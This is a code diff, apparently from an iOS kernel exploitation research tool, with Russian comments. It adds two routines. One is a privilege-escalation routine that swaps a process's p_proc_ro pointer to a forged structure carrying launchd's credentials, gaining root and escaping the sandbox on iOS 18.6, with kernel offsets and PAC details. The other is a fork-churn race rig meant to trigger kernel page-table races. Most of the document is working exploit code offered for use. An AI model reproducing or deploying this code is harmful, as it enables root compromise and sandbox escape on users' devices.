+// POINTER: proc->p_proc_ro (koffsetof(proc, proc_ro)) is a RAW pointer — no
+// PAC, device-log confirmed (raw, no tag) — in the proc zone (heap, RW:
+// fork writes it). proc_ro itself is never written. The forge is a full
+// 0x400 copy of OUR proc_ro in our own wired user page (EXP-09 1.9.3
+// physmap path). Overlaid from launchd's proc_ro (read-only): p_ucred ONLY
+// (SMR-encoded qword — value-level portable, copied byte-for-byte, never
+// decoded/re-encoded) and p_csflags (u32). Device finding (18.6, A17 Pro):
+// task_tokens and the filter-mask pointers are PAC-signed with ADDRESS
+// diversity — copied verbatim to our forge (different address) they fail
+// authentication: "PAC failure from kernel with DA key while authing x16"
+// at verify. They stay OURS in the forge. Everything else (pr_task
+// included) stays ours too. Kernel writes: 8 bytes at proc->p_proc_ro,
+// nothing else. Restore right after verify is MANDATORY: the forged proc_ro
+// points at launchd's ucred without a reference, so exit/exec while swapped
+// drops a ref nobody took → ucred underflow → panic (same shape as E10's
+// port).
++ (NSString *)procRoSwapReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== E11: proc_ro-swap → root+unsandbox (подмена указателя p_proc_ro, RO-зона не трогается) ===\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
+        return r;
+    }
+
+    // Все локалы наверху: между подменой и restore нет ни ARC-объектов, ни
+    // ранних return — выход только через хвост метода.
+    pid_t selfPid = getpid();
+    uint64_t selfProc = 0, procRoRaw = 0, procRo = 0;
+    uint64_t launchdProc = 0, launchdRoRaw = 0, launchdRo = 0;
+    uint64_t task = 0, map = 0, pmap = 0, ttep = 0;
+    uint64_t pa = 0, forgeKVA = 0, rbRaw = 0, origProcRoRaw = 0, procRoSlot = 0;
+    uint64_t probeQ = 0, launchdUcredVA = 0;
+    uint8_t *page = NULL;
+    uid_t newUid = (uid_t)-1;
+    gid_t newGid = (gid_t)-1;
+    BOOL didSwap = NO, stuck = NO, restored = NO, uidRoot = NO, unsandboxOK = NO;
+    char commBuf[33];
+    uint8_t selfRo[0x400], ldRo[0x400];
+
+    // proc_ro-лестница. На 18.6 (Darwin 24.6, ветка «18.4+» в shim info.c —
+    // сдвиг +0x8 от p_orig_ppid, тот же ход, что в Dopamine info.c): ожидаем
+    // proc.proc_ro=0x18 · ucred=0x28 · csflags=0x24 · syscall_filter=0x30 ·
+    // task_tokens=0x48 · mach_trap_filter=0x70 · mach_kobj_filter=0x78 ·
+    // t_flags_ro=0x80. (База Dopamine: ucred=0x20/csflags=0x1C — до сдвига.)
+    uint32_t offProcRo   = koffsetof(proc, proc_ro);
+    uint32_t offUcred    = koffsetof(proc_ro, ucred);
+    uint32_t offCsflags  = koffsetof(proc_ro, csflags);
+    uint32_t offSfMask   = koffsetof(proc_ro, syscall_filter_mask);
+    uint32_t offMtMask   = koffsetof(proc_ro, mach_trap_filter_mask);
+    uint32_t offMkMask   = koffsetof(proc_ro, mach_kobj_filter_mask);
+    uint32_t offTokens   = koffsetof(proc_ro, task_tokens);
+    uint32_t offTflagsRo = koffsetof(proc_ro, t_flags_ro);
+    kpNote(r, [NSString stringWithFormat:@"  лестница: proc.proc_ro=+0x%x · proc_ro: ucred=+0x%x csflags=+0x%x syscall_filter=+0x%x task_tokens=+0x%x mach_trap_filter=+0x%x mach_kobj_filter=+0x%x t_flags_ro=+0x%x (exists=%d)",
+              offProcRo, offUcred, offCsflags, offSfMask, offTokens,
+              offMtMask, offMkMask, offTflagsRo, (int)koffsetof(proc_ro, exists)]);
+    if (!koffsetof(proc_ro, exists)) {
+        [r appendString:@"FAIL: proc_ro не существует на этом билде по gSystemInfo\n"];
+        return r;
+    }
+    if (!offProcRo || !offUcred) {
+        [r appendString:@"FAIL: proc.proc_ro / proc_ro.ucred не резолвятся — без них подмена невозможна, стоп (без паники)\n"];
+        return r;
+    }
+    // Копируемые поля должны помещаться в окно 0x400. Копируются ТОЛЬКО
+    // p_ucred и p_csflags — task_tokens и filter-mask указатели PAC-подписаны
+    // с адресной привязкой (device-находка: перенос в форж по другому адресу =
+    // PAC failure DA key при аутентификации → паника), они остаются нашими.
+    if (offUcred + 8 > 0x400 || (offCsflags && offCsflags + 4 > 0x400)) {
+        [r appendString:@"FAIL: поле proc_ro за пределами окна 0x400 — лестница расходится с билдом, стоп\n"];
+        return r;
+    }
+
+    // 1. Свой proc и текущий proc_ro. proc_self() напрямую (оффсет-цепь, без
+    //    обхода allproc — обход был источником паник), fast walk — fallback.
+    kpNote(r, [NSString stringWithFormat:@"  наш pid: %d", selfPid]);
+    selfProc = proc_self();
+    kpNote(r, [NSString stringWithFormat:@"  наш proc (proc_self): 0x%016llx", (unsigned long long)selfProc]);
+    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
+    if (!selfProc) selfProc = [self findSelfProcByComm:r];
+    if (!selfProc) {
+        [r appendString:@"FAIL: свой proc не найден\n"];
+        return r;
+    }
+
+    procRoSlot = selfProc + offProcRo;
+    if (!kpRead(procRoSlot, &procRoRaw, sizeof(procRoRaw), "proc.p_proc_ro", r)) {
+        [r appendString:@"FAIL: proc.p_proc_ro не прочитан\n"];
+        return r;
+    }
+    origProcRoRaw = procRoRaw;
+    procRo = kp_untag_ptr(procRoRaw);
+    kpNote(r, [NSString stringWithFormat:@"  p_proc_ro: raw=0x%016llx → 0x%016llx%@",
+              (unsigned long long)procRoRaw, (unsigned long long)procRo,
+              procRoRaw == procRo ? @" (сырой, без PAC-тега — как в device-логах)" : @" (был тег — untag применён)"]);
+    if (!kpLooksLikeKernelPointer(procRo)) {
+        [r appendString:@"FAIL: proc_ro не kernel-указатель\n"];
+        return r;
+    }
+
+    // Наш proc_ro целиком (RO-зона — ТОЛЬКО ЧИТАЕМ) — основа форжа.
+    memset(selfRo, 0, sizeof(selfRo));
+    if (!kpRead(procRo, selfRo, sizeof(selfRo), "наш proc_ro (0x400)", r)) {
+        [r appendString:@"FAIL: свой proc_ro не прочитан\n"];
+        return r;
+    }
+
+    // 2. launchd (pid 1) — ТОЛЬКО fast pid-walk (дисциплина E10: опасные
+    //    fallback'и отключены намеренно). launchd и его proc_ro читаются,
+    //    но НИКОГДА не пишутся.
+    launchdProc = [self findSelfProcByPidFast:1 log:r];
+    if (!launchdProc) {
+        [r appendString:@"FAIL: launchd (pid 1) не найден fast walk'ом — счётчик узлов в логе выше\n"];
+        return r;
+    }
+    memset(commBuf, 0, sizeof(commBuf));
+    if (kpRead(launchdProc + off_proc_p_name, commBuf, 32, "launchd comm", r)) {
+        kpNote(r, [NSString stringWithFormat:@"  comm pid 1: \"%s\" (ждём launchd)", commBuf]);
+        if (strncmp(commBuf, "launchd", 7) != 0) {
+            kpNote(r, @"  ВНИМАНИЕ: comm не launchd — pid-оффсет под вопросом, продолжаю (решает верификация)");
+        }
+    }
+    if (!kpRead(launchdProc + offProcRo, &launchdRoRaw, sizeof(launchdRoRaw), "launchd proc.p_proc_ro", r)) {
+        [r appendString:@"FAIL: launchd p_proc_ro не прочитан\n"];
+        return r;
+    }
+    launchdRo = kp_untag_ptr(launchdRoRaw);
+    kpNote(r, [NSString stringWithFormat:@"  launchd proc_ro: raw=0x%016llx → 0x%016llx",
+              (unsigned long long)launchdRoRaw, (unsigned long long)launchdRo]);
+    if (!kpLooksLikeKernelPointer(launchdRo)) {
+        [r appendString:@"FAIL: launchd proc_ro не kernel-указатель\n"];
+        return r;
+    }
+    // Тот же рубеж, что в E10: дальше каждое чтение идёт по вычисленному
+    // адресу — требуем вооружённый unmapped-гейт kpRead, иначе стоп.
+    if (!gCpuTtepVA && !gCpuTtepPhys) {
+        [r appendString:@"FAIL: translation-гейт не поднят (gCpuTtepVA/gCpuTtepPhys == 0) — чтения по launchd-цепочке пошли бы безгейтово, стоп до паники\n"];
+        return r;
+    }
+    memset(ldRo, 0, sizeof(ldRo));
+    if (!kpRead(launchdRo, ldRo, sizeof(ldRo), "launchd proc_ro (0x400)", r)) {
+        [r appendString:@"FAIL: launchd proc_ro не прочитан\n"];
+        return r;
+    }
+
+    // Диагностика launchd p_ucred: SMR-декод (kpSMRDecode из E10 — формула
+    // обратима, тег SMR, не PAC: untag только ПОСЛЕ декода) → VA → cr_uid.
+    // В форж qword попадает ДОСЛОВНО — декод здесь только валидация для лога.
+    {
+        uint64_t ldUcredRaw = 0, dec = 0;
+        memcpy(&ldUcredRaw, ldRo + offUcred, sizeof(ldUcredRaw));
+        dec = kpSMRDecode(ldUcredRaw);
+        launchdUcredVA = kp_untag_ptr(dec);
+        kpNote(r, [NSString stringWithFormat:@"  launchd p_ucred (SMR): raw=0x%016llx → decode=0x%016llx → VA=0x%016llx",
+                  (unsigned long long)ldUcredRaw, (unsigned long long)dec, (unsigned long long)launchdUcredVA]);
+        if (kpLooksLikeKernelPointer(launchdUcredVA)) {
+            uint32_t uid = 0xFFFFFFFF;
+            if (kpRead(launchdUcredVA + 0x18, &uid, sizeof(uid), "launchd ucred.cr_uid", r)) {
+                kpNote(r, [NSString stringWithFormat:@"  launchd ucred.cr_uid = %u (ждём 0)%@", uid,
+                          uid == 0 ? @"" : @" — НЕ root?! qword всё равно копируется дословно"]);
+            }
+        }
+        else {
+            kpNote(r, @"  ВНИМАНИЕ: SMR-декод launchd ucred не дал kernel VA — копия всё равно дословная (value-level переносим)");
+        }
+    }
+
+    // 3. Форж в нашей wired-странице — physmap-путь EXP-09 1.9.3 дословно:
+    //    posix_memalign(0x4000) + запись + mlock → vtophys по НАШЕМУ pmap →
+    //    phystokv → kernel VA. Страница НИКОГДА не освобождается — форж живёт
+    //    в ней (как pipe-буфер EXP-09 / wired-страница 1.9.3).
+    if (posix_memalign((void **)&page, 0x4000, 0x4000) != 0 || !page) {
+        [r appendString:@"FAIL: posix_memalign\n"];
+        return r;
+    }
+    memset(page, 0, 0x4000);
+    // База форжа — НАШ proc_ro целиком: pr_task и все прочие поля остаются
+    // нашими. Поверх — ТОЛЬКО p_ucred и p_csflags от launchd.
+    memcpy(page, selfRo, sizeof(selfRo));
+    if (mlock(page, 0x4000) != 0) {
+        kpNote(r, [NSString stringWithFormat:@"  mlock: %s — продолжаю (страница свежая, не выгрузится сразу)", strerror(errno)]);
+    }
+    {
+        uint64_t qSelf = 0, qLd = 0;
+        // p_ucred: SMR qword дословно (8 байт) — не декодируем/не перекодируем.
+        // SMR — value-level (тег кодирует значение, не адрес), переносимо.
+        memcpy(&qSelf, selfRo + offUcred, 8);
+        memcpy(&qLd, ldRo + offUcred, 8);
+        memcpy(page + offUcred, ldRo + offUcred, 8);
+        kpNote(r, [NSString stringWithFormat:@"  форж: p_ucred @+0x%x: наш raw=0x%016llx → launchd raw=0x%016llx (дословно)",
+                  offUcred, (unsigned long long)qSelf, (unsigned long long)qLd]);
+        if (offCsflags) {
+            uint32_t fSelf = 0, fLd = 0;
+            memcpy(&fSelf, selfRo + offCsflags, 4);
+            memcpy(&fLd, ldRo + offCsflags, 4);
+            memcpy(page + offCsflags, ldRo + offCsflags, 4);
+            kpNote(r, [NSString stringWithFormat:@"  форж: p_csflags @+0x%x: наш=0x%08x → launchd=0x%08x",
+                      offCsflags, fSelf, fLd]);
+        }
+        else {
+            kpNote(r, @"  форж: proc_ro.csflags не резолвится — оставлен наш (TODO: захардкодить 0x24 для 18.4+)");
+        }
+        // task_tokens / syscall_filter_mask / mach_trap_filter_mask /
+        // mach_kobj_filter_mask от launchd НЕ копируются — device-находка
+        // (18.6, A17 Pro): они PAC-подписаны с АДРЕСНОЙ привязкой к proc_ro
+        // launchd. Дословный перенос в наш форж (другой адрес) давал
+        // «PAC failure from kernel with DA key while authing x16» на verify →
+        // ребут. В форже эти поля остаются НАШИМИ (из копии нашего proc_ro).
+        kpNote(r, @"  форж: task_tokens и filter masks — НАШИ (launchd'овские PAC-signed, address-bound → не переносимы)");
+    }
+
+    // Цепь к нашему pmap по НАШЕМУ proc_ro (до подмены):
+    // proc_ro -> pr_task -> task.map -> vm_map.pmap -> pmap.ttep
+    if (!kpRead(procRo + off_proc_ro_pr_task, &task, sizeof(task), "proc_ro.pr_task", r)) return r;
+    task = kp_untag_ptr(task);
+    if (!kpLooksLikeKernelPointer(task)) { [r appendString:@"FAIL: task\n"]; return r; }
+    if (!kpRead(task + off_task_map, &map, sizeof(map), "task.map", r)) return r;
+    map = kp_untag_ptr(map);
+    if (!kpLooksLikeKernelPointer(map)) { [r appendString:@"FAIL: map\n"]; return r; }
+    if (!kpRead(map + koffsetof(vm_map, pmap), &pmap, sizeof(pmap), "vm_map.pmap", r)) return r;
+    pmap = kp_untag_ptr(pmap);
+    if (!kpLooksLikeKernelPointer(pmap)) { [r appendString:@"FAIL: pmap\n"]; return r; }
+    if (!kpRead(pmap + koffsetof(pmap, ttep), &ttep, sizeof(ttep), "pmap.ttep", r)) return r;
+    ttep = kp_untag_ptr(ttep);
+    kpNote(r, [NSString stringWithFormat:@"  цепь: task=%#llx map=%#llx pmap=%#llx ttep=%#llx",
+              (unsigned long long)task, (unsigned long long)map,
+              (unsigned long long)pmap, (unsigned long long)ttep]);
+
+    // PA нашей страницы через НАШ pmap, затем kernel VA через настоящий
+    // ptov_table (phystokv) — на A17 physmap НЕ линеен от physBase (1.9.4).
+    pa = vtophys(ttep, (uint64_t)page);
+    if (!pa) {
+        [r appendString:@"FAIL: vtophys нашей страницы = 0 (не замаплена?)\n"];
+        return r;
+    }
+    forgeKVA = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+    kpNote(r, [NSString stringWithFormat:@"  страница: userVA=%#llx pa=%#llx → kernel VA (ptov)=%#llx",
+              (unsigned long long)page, (unsigned long long)pa, (unsigned long long)forgeKVA]);
+    if (!kpLooksLikeKernelPointer(forgeKVA)) {
+        uint64_t lin = kconstant(virtBase) + (pa - kconstant(physBase));
+        kpNote(r, [NSString stringWithFormat:@"  ptov дал 0 — линейная оценка: %#llx", (unsigned long long)lin]);
+        [r appendString:@"FAIL: phystokv не дал kernel VA для страницы\n"];
+        return r;
+    }
+
+    // Sanity: читаем форж обратно ПО kernel VA — qword[0] совпадает с нашим
+    // proc_ro[0] (форж начинается с нашей копии).
+    if (kpRead(forgeKVA, &probeQ, sizeof(probeQ), "forge readback", r)) {
+        uint64_t selfQ = 0;
+        memcpy(&selfQ, selfRo, 8);
+        kpNote(r, [NSString stringWithFormat:@"  чтение форжа по kernel VA: %#llx (наш proc_ro[0]=%#llx — %s)",
+                  (unsigned long long)probeQ, (unsigned long long)selfQ,
+                  probeQ == selfQ ? "совпал" : "РАЗЛИЧАЕТСЯ?!"]);
+    }
+
+    // Предфильтр записи (дисциплина EXP-09): цель — наш proc (proc-зона) —
+    // обязана быть heap-типа. proc_ro (RO-зона) НЕ пишется — тип только в лог.
+    if (gFrameTableVA) {
+        int tProc = -1, tRo = -1;
+        uint64_t fpa = kvtophys(selfProc);
+        if (fpa) tProc = kpFrameTypeOfPALogged(gFrameTableVA, fpa, r);
+        fpa = kvtophys(procRo);
+        if (fpa) tRo = kpFrameTypeOfPALogged(gFrameTableVA, fpa, r);
+        kpNote(r, [NSString stringWithFormat:@"  типы фреймов: proc=%@ proc_ro=%@ (heap=0x%02x)",
+                  tProc < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tProc],
+                  tRo < 0 ? @"?" : [NSString stringWithFormat:@"0x%02x", tRo],
+                  gHeapFrameType]);
+        if (gHeapTypeKnown && tProc >= 0 && tProc != gHeapFrameType) {
+            [r appendString:@"FAIL: наш proc НЕ heap-типа (RO-зона?!) — запись отменена до паники\n"];
+            return r;
+        }
+    }
+    else {
+        [r appendString:@"  оракул типов недоступен — продолжаю без предфильтра (proc пишется форком → обычная зона)\n"];
+    }
+
+    // 4. Подмена: одна 8-байтная heap-запись в НАШ proc. Поле сырое (без
+    //    PAC) — пишем канонический kernel VA форжа как есть. Оригинал —
+    //    дословный raw qword — сохранён выше для restore.
+    kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (форж; оригинал raw=0x%016llx сохранён)",
+              (unsigned long long)procRoSlot, (unsigned long long)forgeKVA, (unsigned long long)origProcRoRaw]);
+    kwritebuf(procRoSlot, &forgeKVA, sizeof(forgeKVA));
+    didSwap = YES;
+    rbRaw = 0;
+    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro readback", r);
+    kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
+              (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
+    stuck = (rbRaw == forgeKVA);
+
+    if (stuck) {
+        // 5. Verify: getuid() перечитывает proc_ro->p_ucred на каждый вызов
+        //    (доказано EXP-09) — с форжем это ucred launchd. Проба на
+        //    unsandbox — запись в /private/var/root.
+        newUid = getuid();
+        newGid = getgid();
+        uidRoot = (newUid == 0);
+        kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d getgid()=%d%@",
+                  newUid, newGid, uidRoot ? @" ← ROOT" : @""]);
+
+        const char *probePath = "/private/var/root/kexproof-e11-probe.txt";
+        errno = 0;
+        FILE *f = fopen(probePath, "w");
+        if (f) {
+            fputs("kexproof e11\n", f);
+            fclose(f);
+            unlink(probePath);
+            unsandboxOK = YES;
+            [r appendString:@"  /private/var/root: запись УДАЛАСЬ — sandbox не держит (ucred+label launchd)\n"];
+        }
+        else {
+            kpNote(r, [NSString stringWithFormat:@"  /private/var/root: %s — %@", strerror(errno),
+                      uidRoot ? @"uid root, но sandbox/MAC ещё действует (label кеширован?)" : @"uid не root"]);
+        }
+    }
+    else {
+        [r appendString:@"FAIL: подмена не прилипла — kwrite по proc-зоне не работает\n"];
+    }
+
+    // 6. RESTORE — обязателен, немедленно после verify, до любого выхода.
+    //    Форж ссылается на ucred launchd без взятого рефа: exit/exec/fork-пути
+    //    учётки с подменённым proc_ro уронили бы рефкаунт ucred launchd →
+    //    паника. Форж-страница wired и НЕ освобождается — restore единственное
+    //    условие безопасного выхода. Пишем дословный оригинальный raw qword.
+    if (didSwap) {
+        kwritebuf(procRoSlot, &origProcRoRaw, sizeof(origProcRoRaw));
+        rbRaw = 0;
+        kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro restore readback", r);
+        restored = (rbRaw == origProcRoRaw);
+        kpNote(r, [NSString stringWithFormat:@"  restore: p_proc_ro=0x%016llx (ждём 0x%016llx) — %@",
+                  (unsigned long long)rbRaw, (unsigned long long)origProcRoRaw,
+                  restored ? @"OK" : @"НЕ СОШЛОСЬ"]);
+        if (!restored) {
+            [r appendString:@"КРИТИЧНО: restore НЕ подтверждён — proc всё ещё указывает на форж. Страница wired и валидна, но ucred launchd без рефа: НЕ убивай и НЕ перезапускай приложение до ребута (exit = паника)!\n"];
+        }
+    }
+
+    if (uidRoot && unsandboxOK && restored) {
+        [r appendString:@"\n=== E11 PASS: root + unsandbox через proc_ro-swap. Записано: 8 байт в наш proc (heap); launchd и его proc_ro не писались; p_proc_ro восстановлен. ===\n"];
+    }
+    else if (uidRoot && restored) {
+        [r appendString:@"\n=== E11 ЧАСТИЧНО: uid 0 получен, но /private/var/root не открылся — sandbox/MAC держит (label кеширован на task?). Подмена восстановлена, паники не было. ===\n"];
+    }
+    else if (!restored) {
+        [r appendString:@"\n=== E11 FAIL: restore не подтверждён — см. КРИТИЧНО выше ===\n"];
+    }
+    else if (stuck) {
+        [r appendFormat:@"\n=== E11 FAIL: указатель подменялся и восстановлен чисто, но getuid()=%d — creds кешируются не из proc_ro? См. лог ===\n", newUid];
+    }
+    else {
+        [r appendString:@"\n=== E11 FAIL: подмена не прилипла (kwrite по proc-зоне не работает?); слот цел, restore-проверка сошлась — паники не было ===\n"];
+    }
+    return r;
+}
+
+#pragma mark - EXP-13: nest/unnest race rig (may-panic by design)
+
+// The churn primitive: every fork() nests the shared-cache subordinate pmap
+// into the child (~192 SPTM nest calls on the shared-cache twigs per fork on
+// 18.6), the instant _exit+waitpid tears it back down (unnest, endpoint 11).
+// pmap_nest_internal is two SPTM calls (ids 9, 10) with kernel state mutated
+// between them — the twig frame's FTE (type/level/owner/rw_guard) is exactly
+// the state that can desync mid-sequence.
+
+#define KP_EXP13_CHURN_THREADS 4
+
+struct kpExp13FTE {
+    uint16_t rwGuard; // fte+0: ≥2 while the nested mapping is alive
+    uint8_t  type;    // fte+2: 0x0b=XNU_DEFAULT · 0x14=leaf · CPU PT={0x08,0x11,0x12,0x1f}
+    uint8_t  level;   // fte+4
+    uint8_t  owner;   // fte+8: single byte (0xff=unowned) — 1.9.10: was u64
+};
+
+struct kpExp13ChurnCtx {
+    volatile int stop;           // rig → threads: прекратить churn
+    volatile int forkBroken;     // threads → rig: сколько потоков сломались на fork()
+    volatile int forkErrno;      // errno первого неудачного fork()
+    volatile uint64_t forks;     // успешных fork+waitpid циклов (суммарно, допускает гонку счётчика)
+};
+
+static void kpExp13ParseFTE(const uint8_t fte[16], struct kpExp13FTE *out)
+{
+    memcpy(&out->rwGuard, fte + 0, sizeof(out->rwGuard));
+    out->type = fte[2];
+    out->level = fte[4];
+    memcpy(&out->owner, fte + 8, sizeof(out->owner));
+}
+
+static void *kpExp13ChurnMain(void *arg)
+{
+    struct kpExp13ChurnCtx *ctx = (struct kpExp13ChurnCtx *)arg;
+    while (!ctx->stop) {
+        pid_t p = fork();
+        if (p == 0) _exit(0); // child: nothing but the nest/unnest cycle itself
+        if (p > 0) {
+            int st = 0;
+            waitpid(p, &st, 0);
+            ctx->forks++;
+        }
+        else {
+            ctx->forkErrno = errno;
+            ctx->forkBroken++;
+            break;
+        }
+    }
+    return NULL;
+}
+
+// Instrumented page-table walk for EXP-13 bring-up: same logic as
+// vtophys_lvl (16K, root L1, PA/VA branch by the top bits of ttep) but logs
+// every level's raw TTE so a field run shows exactly where a walk breaks.
+static void kpExp13DebugWalk(NSMutableString *r, const char *tag, uint64_t ttep, uint64_t va)
+{
+    BOOL physical = !(ttep & 0xf000000000000000ULL);
+    kpNote(r, [NSString stringWithFormat:@"  debug-walk %s: ttep=0x%016llx (%s) va=0x%016llx",
+              tag, (unsigned long long)ttep, physical ? "physical" : "virtual", (unsigned long long)va]);
+    uint64_t cur = ttep;
+    for (uint64_t lvl = PMAP_TT_L1_LEVEL; lvl <= PMAP_TT_L3_LEVEL; lvl++) {
+        struct tt_level *lvlp = &arm_tt_level[lvl];
+        uint64_t idx = (va & lvlp->indexMask) >> lvlp->shift;
+        uint64_t tteAddr = cur + idx * 8;
+        uint64_t entry = physical ? physread64(tteAddr) : kread64(tteAddr);
+        BOOL valid = ((entry & lvlp->validMask) == lvlp->validMask);
+        BOOL block = ((entry & lvlp->typeMask) == lvlp->typeBlock);
+        kpNote(r, [NSString stringWithFormat:@"    L%llu idx=%llu tte@0x%016llx raw=0x%016llx valid=%d type=%s",
+                  (unsigned long long)lvl, (unsigned long long)idx,
+                  (unsigned long long)tteAddr, (unsigned long long)entry,
+                  valid ? 1 : 0, block ? "block" : "table"]);
+        if (!valid) {
+            kpNote(r, @"    обрыв: entry невалиден на этом уровне");
+            return;
+        }
+        if (block) {
+            uint64_t pa = (entry & ARM_TTE_PA_MASK & ~lvlp->offMask) | (va & lvlp->offMask);
+            kpNote(r, [NSString stringWithFormat:@"    block mapping → PA=0x%016llx", (unsigned long long)pa]);
+            return;
+        }
+        cur = entry & ARM_TTE_TABLE_MASK;
+        if (!physical) cur = phystokv(cur);
+    }
+    kpNote(r, [NSString stringWithFormat:@"    конец обхода: последняя таблица=0x%016llx", (unsigned long long)cur]);
+}
+
++ (NSString *)sptmNestRaceReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== EXP-13: nest/unnest race rig (МОЖЕТ ПАНИКОВАТЬ — это нормально) ===\n"];
+    if (!gPrimitives.kreadbuf) {
+        [r appendString:@"KRW-примитивы не живы — сначала эксплойт.\n"];
+        return r;
+    }
+    [r appendString:@"Все находки sync-пишутся в kexproof-live.log ДО возможной паники — после ребута смотри live/prev лог.\n"];
+
+    // 1. Chain to our pmap (the EXP-09 1.9.3 ladder):
+    //    proc -> proc_ro -> task -> vm_map -> pmap -> ttep
+    pid_t selfPid = getpid();
+    kpNote(r, [NSString stringWithFormat:@"  наш pid: %d", selfPid]);
+    uint64_t selfProc = proc_self();
+    kpNote(r, [NSString stringWithFormat:@"  наш proc (proc_self): 0x%016llx", (unsigned long long)selfProc]);
+    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)selfPid log:r];
+    if (!selfProc) selfProc = [self findSelfProcByComm:r];
+    if (!selfProc) {
+        [r appendString:@"FAIL: свой proc не найден\n"];
+        return r;
+    }
+
+    uint64_t procRoRaw = 0;
+    if (!kpRead(selfProc + koffsetof(proc, proc_ro), &procRoRaw, sizeof(procRoRaw), "proc.proc_ro", r)) return r;
+    uint64_t procRo = kp_untag_ptr(procRoRaw);
+    if (!kpLooksLikeKernelPointer(procRo)) { [r appendString:@"FAIL: proc_ro не kernel-указатель\n"]; return r; }
+
+    uint64_t task = 0, map = 0, pmap = 0, ttep = 0;
+    if (!kpRead(procRo + off_proc_ro_pr_task, &task, sizeof(task), "proc_ro.pr_task", r)) return r;
+    task = kp_untag_ptr(task);
+    if (!kpLooksLikeKernelPointer(task)) { [r appendString:@"FAIL: task\n"]; return r; }
+    if (!kpRead(task + off_task_map, &map, sizeof(map), "task.map", r)) return r;
+    map = kp_untag_ptr(map);
+    if (!kpLooksLikeKernelPointer(map)) { [r appendString:@"FAIL: map\n"]; return r; }
+    if (!kpRead(map + koffsetof(vm_map, pmap), &pmap, sizeof(pmap), "vm_map.pmap", r)) return r;
+    pmap = kp_untag_ptr(pmap);
+    if (!kpLooksLikeKernelPointer(pmap)) { [r appendString:@"FAIL: pmap\n"]; return r; }
+    if (!kpRead(pmap + koffsetof(pmap, ttep), &ttep, sizeof(ttep), "pmap.ttep", r)) return r;
+    kpNote(r, [NSString stringWithFormat:@"  pmap.ttep raw=0x%016llx", (unsigned long long)ttep]);
+    ttep = kp_untag_ptr(ttep); // PA-valued; untag is a no-op on ≤47-bit phys
+    kpNote(r, [NSString stringWithFormat:@"  цепь: task=%#llx map=%#llx pmap=%#llx ttep=%#llx",
+              (unsigned long long)task, (unsigned long long)map,
+              (unsigned long long)pmap, (unsigned long long)ttep]);
+
+    // 2. Nested subordinate (18.6 pmap slots; nested_pmap is CAS-swapped).
+    uint64_t nestedRaw = 0, nestedAddr = 0, nestedSize = 0;
+    if (!kpRead(pmap + 0x50, &nestedRaw, sizeof(nestedRaw), "pmap.nested_pmap", r)) return r;
+    kpNote(r, [NSString stringWithFormat:@"  pmap+0x50 nested_pmap: raw=0x%016llx", (unsigned long long)nestedRaw]);
+    if (!nestedRaw) {
+        [r appendString:@"SKIP: nested_pmap=0 — у нашего pmap нет вложенного subordinate (shared cache не nested?). Гонять нечего.\n"];
+        return r;
+    }
+    if (!kpRead(pmap + 0x58, &nestedAddr, sizeof(nestedAddr), "pmap.nested_region_addr", r)) return r;
+    if (!kpRead(pmap + 0x60, &nestedSize, sizeof(nestedSize), "pmap.nested_region_size", r)) return r;
+    uint64_t subord = kp_untag_ptr(nestedRaw);
+    kpNote(r, [NSString stringWithFormat:@"  subordinate pmap=0x%016llx · nested region VA=0x%016llx size=0x%llx (%llu twig'ов по 32 МБ)",
+              (unsigned long long)subord, (unsigned long long)nestedAddr, (unsigned long long)nestedSize,
+              (unsigned long long)(nestedSize / ARM_16K_TT_L2_SIZE)]);
+    if (!kpLooksLikeKernelPointer(subord)) {
+        [r appendString:@"FAIL: nested_pmap не kernel-указатель\n"];
+        return r;
+    }
+
+    uint64_t subTtep = 0;
+    if (!kpRead(subord + koffsetof(pmap, ttep), &subTtep, sizeof(subTtep), "subord pmap.ttep", r)) return r;
+    kpNote(r, [NSString stringWithFormat:@"  subord pmap.ttep raw=0x%016llx", (unsigned long long)subTtep]);
+    subTtep = kp_untag_ptr(subTtep);
+    kpNote(r, [NSString stringWithFormat:@"  subordinate ttep=%#llx (%s-формой пойдёт в vtophys_lvl)",
+              (unsigned long long)subTtep, (subTtep & 0xf000000000000000ULL) ? "VA" : "PA"]);
+
+    // 3. Twig pick. PRIMARY source: walk OUR OWN (grand) pmap for
+    //    nestedAddr + T*32MB down to level L2 — the parent's L2 entry for a
+    //    nested region references the subordinate's twig (L2) table, so this
+    //    yields the twig PA without depending on the subordinate's ttep.
+    //    CROSS-CHECK: the subordinate's own walk to L1 must return the same
+    //    PA (its L1 entry points at that twig table); a mismatch/failure is
+    //    logged, not fatal. Diagnostics first: per-level raw TTEs for T=0 on
+    //    both pmaps, so a field run shows exactly where either walk breaks.
+    kpExp13DebugWalk(r, "grand T=0", ttep, nestedAddr);
+    kpExp13DebugWalk(r, "subordinate T=0", subTtep, nestedAddr);
+
+    uint64_t twigScan = nestedSize / ARM_16K_TT_L2_SIZE;
+    if (twigScan > 64) twigScan = 64; // shared cache lives at the region start; no need to sweep all 192
+    int64_t chosenT = -1;
+    uint64_t twigPA = 0, twigVA = 0;
+    BOOL twigMatchesSubord = NO;
+    int loggedMisses = 0;
+    uint64_t misses = 0;
+    for (uint64_t t = 0; t < twigScan; t++) {
+        uint64_t va = nestedAddr + t * ARM_16K_TT_L2_SIZE;
+        errno = 0;
+        uint64_t glvl = PMAP_TT_L2_LEVEL;
+        uint64_t gTteAddr = 0;
+        uint64_t gpa = vtophys_lvl(ttep, va, &glvl, &gTteAddr);
+        BOOL gpaOK = gpa && (gpa & 0x3fffULL) == 0 && gpa < 0x100000000000ULL;
+        if (!gpaOK) {
+            misses++;
+            if (loggedMisses++ < 6) {
